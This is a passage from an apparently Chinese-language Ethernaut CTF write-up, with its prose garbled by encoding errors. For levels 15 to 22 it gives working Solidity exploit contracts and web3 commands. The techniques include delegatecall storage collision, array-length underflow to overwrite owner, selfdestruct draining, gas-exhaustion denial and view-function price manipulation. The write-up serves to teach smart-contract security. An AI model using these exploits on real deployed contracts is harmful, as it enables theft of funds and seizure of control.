<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_value</span><span class="p">)</span> <span class="k">override</span> <span class="k">public</span> <span class="n">lockTokens</span> <span class="k">returns</span><span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nb">super</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">_to</span><span class="p">,</span> <span class="n">_value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Prevent the initial owner from transferring tokens until the timelock has passed
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kd">modifier</span> <span class="nf">lockTokens</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span> <span class="o">==</span> <span class="n">player</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nb">require</span><span class="p">(</span><span class="nb">now</span> <span class="o">&gt;</span> <span class="n">timeLock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">_</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">     <span class="k">_</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>NaughtCoin ç¹¼æ‰¿äº† openzeppelin ERC20ï¼šåˆ©ç”¨ approve() + transferFrom()</p>
<h3 id="exploit-14">Exploit</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">totalBalance</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">player</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">v</span> <span class="p">=&gt;</span> <span class="nx">v</span><span class="p">.</span><span class="nx">toString</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">player</span><span class="p">,</span> <span class="nx">totalBalance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">player</span><span class="p">,</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span> <span class="nx">totalBalance</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="16-preservation">16. Preservation</h2>
<p>ç›®æ¨™ <code>owner = player</code></p>
<p>è§€å¯Ÿ setFirstTime æœ‰å€‹ delegatecall</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">  <span class="c1">// set the time for timezone 1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kd">function</span> <span class="nf">setFirstTime</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_timeStamp</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">timeZone1Library</span><span class="p">.</span><span class="nb">delegatecall</span><span class="p">(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="n">setTimeSignature</span><span class="p">,</span> <span class="n">_timeStamp</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">LibraryContract</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// stores a timestamp 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">uint</span> <span class="n">storedTime</span><span class="p">;</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">setTime</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_time</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">storedTime</span> <span class="o">=</span> <span class="n">_time</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä»”ç´°çœ‹æœƒç™¼ç¾æœ‰ storage collisionï¼Œ<code>storedTime</code> è·Ÿ <code>timeZone1Library</code> éƒ½åœ¨ slot 0ï¼Œå¯ä»¥æŠŠ timeZone1Library æ”¹æˆè‡ªå·±çš„åˆç´„ï¼Œå¯ä»¥è—‰ç”± delegatecall å‘¼å«è‡ªå·±çš„åˆç´„ï¼Œä¸¦åˆ©ç”¨ storage collision æ”¹æ‰ ownerã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">       |  LibraryContract         Preservation          Exploit
</span></span><span class="line"><span class="cl">----------------------------------------------------------------------
</span></span><span class="line"><span class="cl">slot 0 |     storedTime   &lt;-   timeZone1Library     timeZone1Library
</span></span><span class="line"><span class="cl">slot 1 |        _              timeZone2Library     timeZone2Library
</span></span><span class="line"><span class="cl">slot 2 |        _                   owner                owner
</span></span><span class="line"><span class="cl">slot 3 |        _                 storedTime
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="exploit-15">Exploit</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">PreservationAttack</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="n">timeZone1Library</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="n">timeZone2Library</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">address</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">setTime</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_time</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">setFirstTime</span><span class="p">(</span><span class="nx">exp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">setFirstTime</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="17-recovery">17. Recovery</h2>
<p>ç›®æ¨™æ‰¾åˆ° simpleToken çš„ address ä¸¦è®“ä»–çš„ ether æ­¸ 0</p>
<p>å» XXXscan ä¸Šè§€å¯Ÿ addressï¼Œåˆ©ç”¨ selfdestruct å°‡åˆç´„çš„ ether å…¨æ•¸è½‰å‡º</p>
<p>æ­£è¦è§£æ³•è¦ç®—å‡º contract address</p>
<h3 id="exploit-16">Exploit</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">ISimpleToken</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">destroy</span><span class="p">(</span><span class="kt">address</span> <span class="k">payable</span> <span class="n">_to</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Exp</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">(</span><span class="kt">address</span> <span class="n">_addr</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ISimpleToken</span><span class="p">(</span><span class="n">_addr</span><span class="p">).</span><span class="n">destroy</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="18-magicnumber">18. MagicNumber</h2>
<p>ç›®æ¨™å¯«å‡ºæœ€å¤šåªèƒ½ç”¨åˆ° 10 opcodes çš„åˆç´„ï¼Œéœ€å›å‚³ magic number 42</p>
<h3 id="runtime-code">Runtime code</h3>
<p>return 42(0x2a)ï¼ŒRETURN æœ‰ 2 å€‹åƒæ•¸: positionã€sizeï¼Œå…ˆå°‡ 42 å­˜é€² memory å†å¾ memory è®€å‡ºä¾†ä¸¦å›å‚³</p>
<ul>
<li>mstore(position, value)</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">602a    Push 0x2a in stack.
</span></span><span class="line"><span class="cl">6050    Push 0x50 in stack.
</span></span><span class="line"><span class="cl">52      Mstore
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li>return(position, size)</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">6020    Push 0x20(32 bytes) in stack.
</span></span><span class="line"><span class="cl">6050    Push 0x50 in stack.
</span></span><span class="line"><span class="cl">f3      RETURN
</span></span></code></pre></td></tr></table>
</div>
</div><p>runtime opcodes å‰›å¥½ 10 bytes</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">602a60505260206050f3
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="init-code">Init code</h3>
<p>å¯ä»¥éƒ¨ç½²ä¸€å€‹åˆç´„çœ‹çœ‹é•·æ€æ¨£</p>
<h3 id="exploit-17">Exploit</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">bytecode = &#39;600a600c600039600a6000f3602a60505260206050f3&#39;
</span></span><span class="line"><span class="cl">txn = await web3.eth.sendTransaction({from: player, data: bytecode})
</span></span><span class="line"><span class="cl">solverAddr = txn.contractAddress
</span></span><span class="line"><span class="cl">await contract.setSolver(solverAddr)
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="19-alien-codex">19. Alien Codex</h2>
<p>ç›®æ¨™ <code>owner = player</code></p>
<p>AlienCodex ç¹¼æ‰¿äº† Ownableï¼Œowner å¿…å®šåœ¨ <code>Ownable-05.sol</code> ä¸­ï¼Œstorage å¾ <code>Ownable-05.sol</code> é–‹å§‹æ’ï¼Œstorage ç¸½å…±æœ‰ <code>2^256</code> å€‹ slotã€‚</p>
<p>å¾ slot 0 é–‹å§‹çœ‹ owner åˆ°åº•åœ¨å“ªå€‹ slot</p>
<p>æ³¨æ„ solidity ç‰ˆæœ¬ <code>0.5.0</code> -&gt; overflow/underflow?</p>
<p>Dynamic array <code>codex</code> çš„ <code>data[0]</code> å­˜æ”¾åœ¨ slot p = keccak256(1)ï¼Œ<code>data[1]</code> åœ¨ keccak256(1)+1ï¼Œä»¥æ­¤é¡æ¨ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">slot 0:      contact | owner
</span></span><span class="line"><span class="cl">slot 1:      codex.length
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">slot p:      codex[0]
</span></span><span class="line"><span class="cl">slot p+1:    codex[1]
</span></span><span class="line"><span class="cl">... 
</span></span><span class="line"><span class="cl">slot 2^256-1:codex[2^256 - 1 - p]
</span></span><span class="line"><span class="cl">slot 0       codex[2^256 - p]
</span></span></code></pre></td></tr></table>
</div>
</div><p>çœ‹åˆ° <code>retract()</code> å¯ä»¥æ”¹è®Š lengthï¼Œè®“ length overflowï¼Œåˆå› ç‚ºç¸½å…±åªæœ‰ <code>2^256</code> å€‹ slotï¼Œå¿…å®šå­˜åœ¨ <code>i</code> ä½¿å¾— <code>codex[i]</code> å­˜åœ¨ slot 0ï¼Œå¯ä»¥ç”¨ <code>revise()</code> æ”¹æ‰åœ¨ slot 0 çš„ ownerã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">retract</span><span class="p">()</span> <span class="n">contacted</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">codex</span><span class="p">.</span><span class="n">length</span><span class="o">--</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="exploit-18">Exploit</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">make_contact</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">retract</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nx">p</span> <span class="o">=</span> <span class="nx">web3</span><span class="p">.</span><span class="nx">utils</span><span class="p">.</span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">web3</span><span class="p">.</span><span class="nx">eth</span><span class="p">.</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodeParameters</span><span class="p">([</span><span class="s2">&#34;uint256&#34;</span><span class="p">],</span> <span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl"><span class="nx">i</span> <span class="o">=</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">2</span> <span class="o">**</span> <span class="mi">256</span><span class="p">)</span> <span class="o">-</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">p</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nx">content</span> <span class="o">=</span> <span class="s1">&#39;0x000000000000000000000000&#39;</span> <span class="o">+</span> <span class="nx">player</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">revise</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="nx">content</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="20-denial">20. Denial</h2>
<p>ç›®æ¨™è®“ owner ç„¡æ³•é€é <code>withdraw()</code> æˆåŠŸææ¬¾</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl">    <span class="c1">// withdraw 1% to recipient and 1% to owner
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">withdraw</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint</span> <span class="n">amountToSend</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">).</span><span class="nb">balance</span><span class="p">.</span><span class="n">div</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// perform a call without checking return
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// The recipient can revert, the owner will still get their share
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">partner</span><span class="p">.</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span><span class="n">amountToSend</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">owner</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="n">amountToSend</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// keep track of last withdrawal time
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">timeLastWithdrawn</span> <span class="o">=</span> <span class="nb">now</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">withdrawPartnerBalances</span><span class="p">[</span><span class="n">partner</span><span class="p">]</span> <span class="o">=</span> <span class="n">withdrawPartnerBalances</span><span class="p">[</span><span class="n">partner</span><span class="p">].</span><span class="n">add</span><span class="p">(</span><span class="n">amountToSend</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>line 7 æœƒåš transferï¼Œåœ¨ line 6 å‹•æ‰‹è…³ï¼Œcall ç„¡é™åˆ¶ gas ç”¨é‡ï¼Œé€éé‡å…¥æˆ–å…¶ä»–æ“ä½œé”æˆ <code>revert: out of gas exception</code>ã€‚</p>
<h3 id="exploit-19">Exploit</h3>
<p>æ–°ç‰ˆæœ¬å¥½åƒä¸èƒ½é€™æ¨£æäº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">DenialAttack</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">fallback</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// consume all the gas
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">assert</span><span class="p">(</span><span class="kc">false</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>or</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">DenialAttack</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">fallback</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span><span class="p">(</span><span class="kc">true</span><span class="p">)</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¨­å®š parnter</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">await</span> <span class="nx">contract</span><span class="p">.</span><span class="nx">setWithdrawPartner</span><span class="p">(</span><span class="nx">exp</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="21-shop">21. Shop</h2>
<p>ç›®æ¨™ <code>price &lt; 100</code></p>
<p>èˆ‡ 11. é¡ä¼¼ï¼Œä½† <code>price()</code> æœ‰ <code>view</code> å±¬æ€§ï¼Œèª¿ç”¨ view functionï¼Œé è¨­ä½¿ç”¨ staticcall</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">function buy() public {
</span></span><span class="line"><span class="cl">    Buyer _buyer = Buyer(msg.sender);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    if (_buyer.price() &gt;= price &amp;&amp; !isSold) {
</span></span><span class="line"><span class="cl">        isSold = true;
</span></span><span class="line"><span class="cl">        price = _buyer.price();
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>line 4 éœ€å›å‚³ &gt; 100ï¼Œline 6 éœ€å›å‚³ &lt; 100ï¼Œå¯ä»¥è—‰ç”± <code>isSold</code> çš„æ”¹è®Šåˆ¤æ–·</p>
<h3 id="exploit-20">Exploit</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// SPDX-License-Identifier: MIT
</span></span><span class="line"><span class="cl">pragma solidity ^0.6.0;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">interface IShop {
</span></span><span class="line"><span class="cl">    function buy() external;
</span></span><span class="line"><span class="cl">    function isSold() external view returns (bool);
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">contract ShopAttack {
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    function price() external view returns (uint) {
</span></span><span class="line"><span class="cl">        return IShop(msg.sender).isSold() ? 1 : 100;
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    function attack(address _shopAddr) external {
</span></span><span class="line"><span class="cl">        IShop(_shopAddr).buy();
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="22-dex">22. DEX</h2>
<p>player æœ‰ 10 token1 åŠ 10 token2ï¼ŒDEX æœ‰ 100 token1 åŠ 100 token2</p>
<p>ç›®æ¨™å°‡ DEX å…¶ä¸­ä¸€ç¨® token æ¸…ï¼</p>
<p><code>swap()</code> åˆ©ç”¨ <code>get_swap_price()</code> ç‚º amount</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
